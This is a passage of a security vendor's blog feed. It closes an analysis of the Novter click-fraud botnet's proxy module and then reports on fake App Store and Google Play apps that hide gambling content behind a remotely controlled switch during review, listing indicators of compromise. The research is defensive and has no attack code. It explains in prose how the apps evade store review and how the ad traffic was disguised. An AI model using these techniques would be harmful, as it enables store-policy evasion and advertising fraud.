<li>A module (which we named “Nodster”) that is written with <a href="https://nodejs.org/en/">NodeJS</a> and <a href="https://socket.io/">io</a> for proxying network traffic. We consider it a module responsible for building the proxy network needed to support the click fraud operations.</li>
</ul>
<h3><strong>Analysis of Novter’s module “Nodster”</strong></h3>
<p>During our analysis of Novter, we came across three notable modules downloaded by the malware. One of them, which we named “Nodster,” is a network proxy module. The module installs NodeJS on the victim’s machine and executes a NodeJS script “app.js” in the background. The script will connect to an embedded C&amp;C server address and receive the second C&amp;C server address.</p>
<p>It will then establish a backconnection to the second C&amp;C server with the socket.io protocol. The second C&amp;C server will return commands to instruct the module to make a TCP connection, send a TCP payload, and return the response from the server back to them. This turns the system infected with Novter become a proxy for the attacker to use.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-4.jpg"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-4.jpg" alt="" width="400" /></a><br />
Figure 4. The communication flow between the Nodster proxy and C&amp;C servers</p>
<h3><strong>Correlating Nodster’s traffic</strong></h3>
<p>During the course of our research, we observed lots of encrypted traffic proxied through the Nodster module, but we managed to decrypt some of it, which showed scripts used for web advertising. This indicates that the C&amp;C server instructed the infected machine to open a website with an embedded JavaScript code related to displaying advertisements.</p>
<p>We also noticed that the ad traffic appeared to have been sent from Android devices, since the HTTP(S) requests transferred through the proxy had HTTP User-Agent headers from Android devices. These requests are appended with a “X-Requested-With” header with many Android app names. We inspected those apps on the Google Play store because we initially thought that the traffic could have been generated by these applications. However, we did not find any suspicious code in these applications that would have generated this traffic. We didn’t find any similar code shared between these Android applications either.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-5.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-5.png" alt="" width="300" /></a><br />
Figure 5. The HTTPS request header spoofed to be from an Android device</p>
<p>With this finding, we inferred that the ad traffic was not coming from the mobile devices, but was instead being generated by the attacker. The attacker disguised the traffic to appear as if it was being sent from Android devices and mobile applications and proxied them through the Novter/Nodster botnet. After all, KovCoreG’s operations involved click fraud.</p>
<h3><strong>Defending against Novter</strong></h3>
<p>Advertisements are an innocuous online staple, but KovCoreG’s campaign demonstrates how they can be intrusive, not to mention how Novter can expose the user’s system to other and actual threats. Given how KovCoreG engages in click fraud, it can significantly affect businesses. A single <a href="https://www.trendmicro.com/vinfo/us/security/news/mobile-safety/mobile-ad-fraud-schemes-how-they-work-and-how-to-defend-against-them">mobile ad fraud</a> incident in 2018, for instance, cost Google and its partners around <a href="https://www.trendmicro.com/vinfo/us/security/research-and-analysis/threat-reports/roundup/2018-mobile-threat-landscape">US$10 million</a> in losses.</p>
<p>Novter also exemplifies fraudsters’ maturing techniques with its use of fileless infection methods and obfuscating its C&amp;C connections and fraud-related traffic. Users, for their part, should adopt best practices, especially against socially engineered threats like <a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malvertising-when-online-ads-attack">malvertisements</a>.</p>
<p>Trend Micro endpoint solutions, such as the <a href="https://www.trendmicro.com/us/business/complete-user-protection/index.html">Smart Protection Suites</a> and <a href="https://www.trendmicro.com/us/small-business/product-security/">Worry-Free Business Security</a> that have <a href="https://success.trendmicro.com/solution/1122593-configuring-behavior-monitoring-settings-in-apex-one">behavior monitoring</a> capabilities, can protect users and businesses from threats like Emotet by detecting malicious files, scripts, and messages as well as blocking all related malicious URLs.  <a href="https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint.html">Trend Micro Apex One</a><img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> protection employs a variety of threat detection capabilities such as behavioral analysis, which protect against malicious scripts, injection, ransomware, memory and browser attacks.</p>
<p>The full details of our research on Novter is in this <a href="https://documents.trendmicro.com/assets/Tech-Brief-New-Fileless-Botnet-Novter-Distributed-by-KovCoreG-Malvertising-Campaign.pdf" target="_blank" rel="noopener noreferrer"><strong><em>technical brief</em></strong></a>, while the indicators of compromise (IoCs) are in this <a href="https://documents.trendmicro.com/assets/Appendix-New-Fileless-Botnet-Novter-Distributed-by-KovCoreG-Malvertising-Campaign.pdf" target="_blank" rel="noopener noreferrer"><strong><em>appendix</em></strong></a>.</p>
<p><em>With additional analysis from Ecular Xu.</em></p>
<p><em>Hat tip to ProofPoint’s researcher Kafeine whom we worked with in this research.</em></p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/new-fileless-botnet-novter-distributed-by-kovcoreg-malvertising-campaign/">New Fileless Botnet Novter Distributed by KovCoreG Malvertising Campaign</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
<div class="feedflare">
<a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:F7zBnMyn0Lo"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=1s3zVxzbXkI:QVGO1BCAYFM:F7zBnMyn0Lo" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:qj6IDK7rITs"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:V_sGLiPBpWU"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=1s3zVxzbXkI:QVGO1BCAYFM:V_sGLiPBpWU" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:l6gmwiTKsz0"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:gIN9vFwOqvQ"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=1s3zVxzbXkI:QVGO1BCAYFM:gIN9vFwOqvQ" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=1s3zVxzbXkI:QVGO1BCAYFM:TzevzKxY174"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174" border="0"></img></a>
</div><img src="http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/1s3zVxzbXkI" height="1" width="1" alt=""/>]]></content:encoded>
							<wfw:commentRss>https://blog.trendmicro.com/trendlabs-security-intelligence/new-fileless-botnet-novter-distributed-by-kovcoreg-malvertising-campaign/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
							<feedburner:origLink>https://blog.trendmicro.com/trendlabs-security-intelligence/new-fileless-botnet-novter-distributed-by-kovcoreg-malvertising-campaign/</feedburner:origLink></item>
		<item>
		<title>Gambling Apps Sneak into Top 100: How Hundreds of Fake Apps Spread on iOS App Store and Google Play</title>
		<link>http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/WFi0W1kTJqw/</link>
				<comments>https://blog.trendmicro.com/trendlabs-security-intelligence/gambling-apps-sneak-top-100-hundreds-fake-apps-spread-app-store-google-play/#respond</comments>
				<pubDate>Thu, 26 Sep 2019 12:03:52 +0000</pubDate>
		<dc:creator><![CDATA[Mobile Threat Response Team]]></dc:creator>
				<category><![CDATA[Mobile]]></category>
		<category><![CDATA[App Store]]></category>
		<category><![CDATA[fake apps]]></category>
		<category><![CDATA[gambling]]></category>
		<category><![CDATA[google play]]></category>

		<guid isPermaLink="false">https://blog.trendmicro.com/trendlabs-security-intelligence/?p=86107</guid>
				<description><![CDATA[<img width="200" height="200" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/09/feature-mobile.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" /><p>We found hundreds of the fake apps on iOS App Store and Google Play, with descriptions that are inconsistent with their content. While the apps’ descriptions varied, they share the same suspicious behavior: They could transform into gambling apps that may get banned for violating local government regulations and app store policies.</p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/gambling-apps-sneak-top-100-hundreds-fake-apps-spread-app-store-google-play/">Gambling Apps Sneak into Top 100: How Hundreds of Fake Apps Spread on iOS App Store and Google Play</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
]]></description>
								<content:encoded><![CDATA[<img width="200" height="200" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/09/feature-mobile.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" /><p><strong>Updated on October 1, 2019 at 7:00 PM PST to amend an app description on App Store.</strong></p>
<p>Google Play and iOS App store are no strangers to fake apps trying to trick users into downloading ad- or malware-ridden versions. We have previously reported on <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/fake-voice-apps-on-google-play-botnet-likely-in-development/" target="_blank" rel="noopener noreferrer">fake Android voice apps</a> on Google Play, which were observed to be impostor apps for voice messenger platforms. Recently, we also uncovered counterfeit applications hiding among legitimate offerings on app stores. These fake apps masquerade as similar apps to trick unwitting users into downloading gambling apps.</p>
<p>We found hundreds of the fake apps on iOS App Store and Google Play, with descriptions that are inconsistent with their content. While the apps’ descriptions varied, they share the same suspicious behavior: They could transform into gambling apps that may get banned for violating local government regulations and app store policies.</p>
<p>Some of the apps ranked in the Top 100 of the App Store and were possibly downloaded numerous times. Some were even rated more than 100,000 times. We’ve notified Apple and Google about our findings. Both have since removed the apps from App Store and Google Play.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1-gambling-apps-screenshot-ios-android.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-1-gambling-apps-screenshot-ios-android.png" alt="Figure 1. Screenshot of the applications, where a seemingly normal app (left) also has an entirely different look (right) Note: iOS apps (top), Android apps (below) " width="300" /></a></p>
<p align="center"><em>Figure 1. Screenshot of the applications, where a seemingly normal app (left) also has an entirely different look (right)<br />
Note: iOS apps (top), Android apps (below)<br />
</em></p>
<h3><strong>How the apps are distributed: From webpage to app store<br />
</strong></h3>
<p>The apps can be downloaded either through a gambling site or the aforementioned app stores. For instance, when visiting the website, the page below will be shown.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-2-gambling-apps-webpage-english-translation.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-2-gambling-apps-webpage-english-translation.png" alt="Figure 2. Original webpage (left) and its English translation (right)" width="300" /></a></p>
<p align="center"><em>Figure 2. Original webpage (left) and its English translation (right)</em></p>
<p>Notably, the download button on the site will redirect the user to the App Store. This means that these gambling apps passed the iOS App Store’s review. In other cases that we observed, some apps had pop-ups of a webpage that lure the user into installing an enterprise app that is not managed by the App Store.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-3-gambling-apps-fake-app-store-page-instructions-enterprise.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-3-gambling-apps-fake-app-store-page-instructions-enterprise.png" alt="Figure 3. Fake App Store page (left) and instructions on how to install enterprise app on iPhone (right)" width="300" /></a></p>
<p align="center"><em>Figure 3. Fake App Store page (left) and instructions on how to install enterprise app on iPhone (right)</em></p>
<p style="text-align: left" align="center">For Android users, the download button will redirect them to a page that hosts an Android application package (APK) file, with the package name “com.bxvip.app.jiuzhouzy”. This APK has the same user interface (UI) of the gambling apps loaded via WebView.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-4-gambling-apps-UI-APK.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-4-gambling-apps-UI-APK.png" alt="Figure 4. The UI of the com.bxvip.app.jiuzhouzy APK" width="250" /></a></p>
<p align="center"><em>Figure 4. The UI of the com.bxvip.app.jiuzhouzy APK</em></p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-5-gambling-apps-global-holiday-info-lottery-UI.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-5-gambling-apps-global-holiday-info-lottery-UI.png" alt="Figure 5. According to its description on the iOS App Store, the app provides global holiday info (left), but the real UI is about a lottery (right)" width="300" /></a></p>
<p align="center"><em>Figure 5. According to its description on the iOS App Store, the app provides global holiday info (left), but the real UI is about a lottery (right)</em></p>
<p>The app’s description on the App Store, as seen above, talks about global holiday info. However, upon opening the app, we found a different content — looking similar to the webpage we previously mentioned. But this time, it exists in a mobile app. The app, as downloaded, was entirely different from its description on the App Store.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-6-gambling-apps-google-play-screenshot-actual-UI.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-6-gambling-apps-google-play-screenshot-actual-UI.png" alt="Figure 6. Screenshots of the app on Google Play and the translated description (top), and the actual UI when launched (below)" width="200" /></a></p>
<p align="center"><em>Figure 6. Screenshots of the app on Google Play and the translated description (top), and the actual UI when launched (below)</em></p>
<p>These fake apps are deployed similarly on Google Play. Figure 6 shows the screenshots of its Google Play listing, and the actual UI when users launch the app.</p>
<h3><strong>How the fake apps bypassed the app stores&#8217; review</strong></h3>
<p>Gambling or real money gaming apps are not prohibited on the App Store and Google Play; however, they are heavily restricted. A June <a href="https://developer.apple.com/news/?id=06032019j" target="_blank" rel="noopener noreferrer">update</a>, for instance, states that HTML5 games distributed within apps may not provide access to real money gaming, lotteries, and others. Google Play, in addition, <a href="https://play.google.com/about/restricted-content/gambling/" target="_blank" rel="noopener noreferrer">only permits</a> gambling apps in certain countries and as long as they meet their requirements. The fake apps we found do not meet the guidelines.</p>
<p>These fake apps start as a seemingly normal app, with varying features and functionalities (e.g., for weather tracking or entertainment purposes), but we found that the fake apps can be controlled to appear innocuous. We describe the whole process in the flowchart below.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-7-gambling-apps-app-stores.jpg"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-7-gambling-apps-app-stores.jpg" alt="Figure 7. How the gambling apps get to the app stores" width="550" /></a></p>
<p align="center"><em>Figure 7. How the gambling apps get to the app stores</em></p>
<p>The fake apps have some interesting behaviors. For one thing, the apps have a “switch” feature, whereby a threat actor can set the app to either show or hide the actual app content. In this case, the API is switched off during the app&#8217;s review process.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-8-gambling-apps-loaded-url-ios-android.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-8-gambling-apps-loaded-url-ios-android.png" alt="Figure 8. Loaded URL Code on iOS (top) and Android (below)" width="300" /></a></p>
<p align="center"><em>Figure 8. Loaded URL Code on iOS (top) and Android (below)</em></p>
<p>We performed a simple replay of the traffic. Note that in the following figure, the word <em>kaiguan</em> means to <em>switch on/off</em> in Mandarin Chinese, and 1700 seems to be an unusual number for these apps.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-9-gambling-apps-response.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-9-gambling-apps-response.png" alt="Figure 9. Response" width="300" /></a></p>
<p align="center"><em>Figure 9. Response</em></p>
<p>The app will query the specified address with its app ID. The corresponding response will be Base64 encoded. If the app ID is invalid, the response will return as empty.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-10-gambling-apps-decoded-response.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-10-gambling-apps-decoded-response.png" alt="Figure 10. Decoded response" width="300" /></a></p>
<p align="center"><em>Figure 10. Decoded response</em></p>
<p>If the data is not empty and can be decoded successfully, the URL will be used to load in WebView.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-11-gambling-apps-loaded-webview-ios-android.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-11-gambling-apps-loaded-webview-ios-android.png" alt="Figure 11. Loaded WebView on iOS (top) and Android (below)" width="300" /></a></p>
<p align="center"><em>Figure 11. Loaded WebView on iOS (top) and Android (below)</em></p>
<p>On iOS, if the response is empty, the WebView will be hidden so that the &#8220;normal&#8221; app could continue.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-12-gambling-apps-failed-request-ios-android.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-12-gambling-apps-failed-request-ios-android.png" alt="Figure 12. Failed request on iOS (top) and Android (below)" width="300" /></a></p>
<p align="center"><em>Figure 12. Failed request on iOS (top) and Android (below)</em></p>
<p>As for Android, if empty, it will just jump to a local activity, and the app will continue its &#8220;normal&#8221; (store-approved) app function.</p>
<p>As a result, this can be used to trick the reviewer. For example, before the app gets reviewed, the developer can simply press the &#8220;off&#8221; switch so a normal-looking app starts (see Figure 1 for the normal and fake app comparisons). The app could pass the app store reviews because the gambling aspect has been hidden.</p>
<p>After the apps have passed the review, they can be publicly downloaded from the app stores. The threat actors then switch it &#8220;on&#8221; to enable viewing of the app&#8217;s actual content.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-13-gambling-apps-implanted-page.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-13-gambling-apps-implanted-page.png" alt="Figure 13. Implanted page on these apps" width="300" /></a></p>
<p align="center"><em>Figure 13. Implanted page on these apps</em></p>
<h3><strong>Fake apps outrank apps they imitate</strong></h3>
<p>At the time of our research, these apps only seem to use WebView to load a gambling website, and do nothing malicious on the device. However, fake as these apps may be, they still outranked the apps they impersonated.</p>
<p>According to Google Play, the apps were only published on August 2019, which explains their low download numbers. This is not the case on the iOS App Store.</p>
<p>A keyword search on the App Store revealed two apps that share the same category. The fake app ranks higher than the app it’s similar to (i.e., the gambling app ranks higher than the wine app).</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-14-gambling-apps-fake-app-legitimate-app-rank.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-14-gambling-apps-fake-app-legitimate-app-rank.png" alt="Figure 14. The fake app ranks higher than the legitimate app" width="300" /></a></p>
<p align="center"><em>Figure 14. The fake app ranks higher than the legitimate app</em></p>
<p>The legitimate apps have been kept updated for two years, while the fake app only had two minor updates for the past six months. We believe that the pop-up WebView was implanted in the second update, on top of using the name and functionality of the legitimate app, to trick users and spread the gambling apps. The actors may also have included SEO techniques to make the app more relevant to search engines.</p>
<p>On the Chinese iOS App Store, for instance, it appears that many of these fake apps have cropped up and are in the Top 100 list. These apps have been highly downloaded, with one of them even getting 440,000 ratings.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-15-gambling-apps-top-rank-normal-apps.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-15-gambling-apps-top-rank-normal-apps.png" alt="Figure 15. Top-ranking gambling apps disguised as “normal” apps" width="300" /></a></p>
<p align="center"><em>Figure 15. Top-ranking gambling apps disguised as “normal” apps</em></p>
<p>We also searched for typical keywords that may relate to the apps on the iOS App Store, and we found the following matching results (limited within certain regions).</p>
<table class="centerTable" style="width: 600px;margin: 0px auto;text-align: left;line-height: 15px">
<tbody>
<tr>
<td style="text-align: center" width="200"><span style="color: #ff0000"><strong><span style="text-align: center;line-height: 15px">Keyword</span></strong></span></td>
<td style="text-align: center" width="90"><span style="color: #ff0000"><strong><span style="text-align: center">CN Market</span></strong></span></td>
<td style="text-align: center" width="90"><span style="color: #ff0000"><b>JP Market</b></span></td>
<td style="text-align: center" width="90"><span style="color: #ff0000"><b>US Market</b></span></td>
</tr>
<tr>
<td style="text-align: center" width="200">重庆时时彩 (Chongqing Lottery Every Hour)</td>
<td style="text-align: center" width="90">214</td>
<td style="text-align: center" width="90">40</td>
<td style="text-align: center" width="90">61</td>
</tr>
<tr>
<td style="text-align: center" width="200">分分彩 (Lottery Every Minute)</td>
<td style="text-align: center" width="90">55</td>
<td style="text-align: center" width="90">26</td>
<td style="text-align: center" width="90">52</td>
</tr>
<tr>
<td style="text-align: center" width="200">北京赛车 (Beijing Racing)</td>
<td style="text-align: center" width="90">314</td>
<td style="text-align: center" width="90">9</td>
<td style="text-align: center" width="90">104</td>
</tr>
</tbody>
</table>
<p align="center"><em>Table 1. App keyword results by country</em></p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-16-gambling-apps-japan-google-search.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-16-gambling-apps-japan-google-search.png" alt="Figure 16. Google search results for Japan" width="300" /></a></p>
<p align="center"><em>Figure 16. Google search results for Japan</em></p>
<h3><strong>Correlating the fake apps&#8217; command-and-control (C&amp;C) communications</strong></h3>
<p>We also found the C&amp;C server, app[.]kaiguan1700[.]com, that was used to control three of the apps included above (it should be noted that its IP address is only hosting this URL). It will respond with another URL to be loaded in WebView, according to the app ID. After we tried accessing it, the server shut down. Interestingly, at the same time, these apps began to behave like normal apps because we &#8220;shut down&#8221; the &#8220;switch&#8221; by accident. This suggests that these fake apps share the same C&amp;C server, which could be a good indicator for identifying fake apps.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-17-gambling-apps-CC-structure-domains-apps.jpg"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/fig-17-gambling-apps-CC-structure-domains-apps.jpg" alt="Figure 17. C&amp;C structure: How different domains and apps were related" width="450" /></a></p>
<p align="center"><em>Figure 17. C&amp;C structure: How different domains and apps were related</em></p>
<p>Since hundreds of fake apps are uploaded to the app stores and they use different developer accounts, their categories vary. Assessing the central C&amp;C server can be a good way to lump the apps together and prevent them from reaching the users.</p>
<h3><strong>Best practices and Trend Micro solutions</strong></h3>
<p>The threat actors here passed the app review process by posing as a run-of-the-mill app, hiding its actual nature (in this case, for gambling). The gambling apps may also be deemed illegal in some countries and rejected by the iOS App Store and Google Play. We contacted Apple and Google about this research. The apps have already been pulled offline.</p>
<p>Furthermore, these methods pose concerns to legitimate app developers and the mobile ecosystem since these highly rated fake apps are occupying the top list. Users, for their part, should adopt <a href="https://www.trendmicro.com/vinfo/us/security/news/mobile-safety/best-practices-securing-your-mobile-device/" target="_blank" rel="noopener noreferrer">best practices</a> for <a href="https://www.trendmicro.com/vinfo/us/security/news/internet-of-things/iot-devices-in-the-workplace-security-risks-and-threats-to-byod-environments" target="_blank" rel="noopener noreferrer">securing mobile devices</a>. We also recommend reading app reviews before installing them, to flag suspicious features or behaviors at the onset.</p>
<p>Users can also install security solutions, such as the <a href="https://www.trendmicro.com/en_us/forHome/products/mobile-security.html" target="_blank" rel="noopener noreferrer">Trend Micro<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Mobile Security for iOS</a> and <a href="https://www.trendmicro.com/en_us/forHome/products/mobile-security.html" target="_blank" rel="noopener noreferrer">Trend Micro<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Mobile Security for Android<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /></a> (also available on <a href="https://play.google.com/store/apps/details?id=com.trendmicro.tmmspersonal" target="_blank" rel="noopener noreferrer">Google Play</a>) solutions, that can block malicious apps. End users can also benefit from their multilayered security capabilities that secure the device owner’s data and privacy, and features that protect them from ransomware, fraudulent websites, and identity theft.</p>
<p>For organizations, the <a href="https://www.trendmicro.com/en_us/business/products/user-protection/sps.html" target="_blank" rel="noopener noreferrer">Trend Micro<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Mobile Security for Enterprise</a> suite provides device, compliance and application management, data protection, and configuration provisioning, as well as protects devices from attacks that exploit vulnerabilities, prevents unauthorized access to apps and detects and blocks malware and fraudulent websites. <a href="https://mars.trendmicro.com/" target="_blank" rel="noopener noreferrer">Trend Micro’s Mobile App Reputation Service</a> (MARS) covers Android and iOS threats using leading sandbox and <a href="https://www.trendmicro.com/vinfo/us/security/definition/machine-learning" target="_blank" rel="noopener noreferrer">machine learning</a> technologies to protect users against malware, zero-day and known exploits, privacy leaks, and application vulnerability.</p>
<h3><strong>Indicators of Compromise (IoCs)</strong></h3>
<p>Some of the identified fake apps on iOS App Store (detected as IOS_Chameleon.A)</p>
<table class="centerTable" style="width: 600px;margin: 0px auto;text-align: left;line-height: 15px">
<tbody>
<tr>
<td style="text-align: center" width="110"><span style="color: #ff0000"><strong><span style="text-align: center;line-height: 15px">App Name/Label</span></strong></span></td>
<td style="text-align: center" width="120"><span style="color: #ff0000"><strong><span style="text-align: center">Bundle Name</span></strong></span></td>
<td style="text-align: center" width="70"><span style="color: #ff0000"><b>Version</b></span></td>
</tr>
<tr>
<td style="text-align: center" width="110">グロ一バルホリデ一情報&#8212; 28元の登録</td>
<td style="text-align: center" width="120">com.luther.worldholiday</td>
<td style="text-align: center" width="70">1.6</td>
</tr>
<tr>
<td style="text-align: center" width="110">グロ一バルホリデ一情報&#8212; 28元の登録</td>
<td style="text-align: center" width="120">com.gavinjeremy.publicholidays</td>
<td style="text-align: center" width="70">1.1</td>
</tr>
<tr>
<td style="text-align: center" width="110">微醺</td>
<td style="text-align: center" width="120">KK.WeiXun</td>
<td style="text-align: center" width="70">1.0.1</td>
</tr>
<tr>
<td style="text-align: center" width="110">semsiye</td>
<td style="text-align: center" width="120">com.semsiye.semsiye</td>
<td style="text-align: center" width="70">1.2</td>
</tr>
<tr>
<td style="text-align: center" width="110">HappyEnglishTOKorean</td>
<td style="text-align: center" width="120">com.HappyEnglishTOKorean</td>
<td style="text-align: center" width="70">1.2</td>
</tr>
<tr>
<td style="text-align: center" width="110">No Hit</td>
<td style="text-align: center" width="120">com.NoHit.cw</td>
<td style="text-align: center" width="70">1.0.2</td>
</tr>
<tr>
<td style="text-align: center" width="110">TeaAssistant</td>
<td style="text-align: center" width="120">com.wuzhongxin.teaassistant</td>
<td style="text-align: center" width="70">1.1</td>
</tr>
<tr>
<td style="text-align: center" width="110">SkyMadness</td>
<td style="text-align: center" width="120">sky.madness.com</td>
<td style="text-align: center" width="70">1.0.1</td>
</tr>
<tr>
<td style="text-align: center" width="110">Simon Color Match</td>
<td style="text-align: center" width="120">com.jda.Color-Match</td>
<td style="text-align: center" width="70">1.3</td>
</tr>
<tr>
<td style="text-align: center" width="110">Classic Poems</td>
<td style="text-align: center" width="120">com.abcd.Poems</td>
<td style="text-align: center" width="70">1.2</td>
</tr>
<tr>
<td style="text-align: center" width="110">Employee attendance tracker</td>
<td style="text-align: center" width="120">com.emp.att</td>
<td style="text-align: center" width="70">1.1</td>
</tr>
</tbody>
</table>
<p>Some of the identified fake apps on Google Play (detected as AndroidOS_Gambling.HRX)</p>
<table class="centerTable" style="width: 600px;margin: 0px auto;text-align: left;line-height: 15px">
<tbody>
<tr>
<td style="text-align: center" width="90"><span style="color: #ff0000"><strong><span style="text-align: center;line-height: 15px">Package Name</span></strong></span></td>
<td style="text-align: center" width="190"><span style="color: #ff0000"><strong><span style="text-align: center">SHA-256</span></strong></span></td>
<td style="text-align: center" width="40"><span style="color: #ff0000"><b>Version</b></span></td>
</tr>
<tr>
<td style="text-align: center" width="90">com.hh.ii.d587</td>
<td style="text-align: center" width="190">B8409F8D625AACEF0DA1C50075443833781FD935DEF608FE396B11D4EEC619AE</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
<tr>
<td style="text-align: center" width="90">com.hh.ii.p557</td>
<td style="text-align: center" width="190">AD791FBAD2C3F06FE7C8CA9820D7D6F62C5C0BAAA835023472ADA1276C80CF7E</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
<tr>
<td style="text-align: center" width="90">com.hh.ii.c603</td>
<td style="text-align: center" width="190">4D7F591760EF07A2F240A6EF0AF4F9544437833A83C68B03E8E04F0E662B38F4</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
<tr>
<td style="text-align: center" width="90">com.liuhe.fenxi.ruanjian</td>
<td style="text-align: center" width="190">98F4C2CAB302C1B5954D8EC3B0658D83958D522DE6157B14171AAA6BB45F5798</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
<tr>
<td style="text-align: center" width="90">com.jz.shequ.jiaoliu</td>
<td style="text-align: center" width="190">8DB2AD04FD93704954CEE498F2431E98CAAD9D1E9BB836DEBD5BBF982A2FD246</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
<tr>
<td style="text-align: center" width="90">com.tain.jing.ssc</td>
<td style="text-align: center" width="190">B7DCF23836919EC4CF5E71D313E4866CDAD0C8D514BFF0DE8C3147E65D3EEA93</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
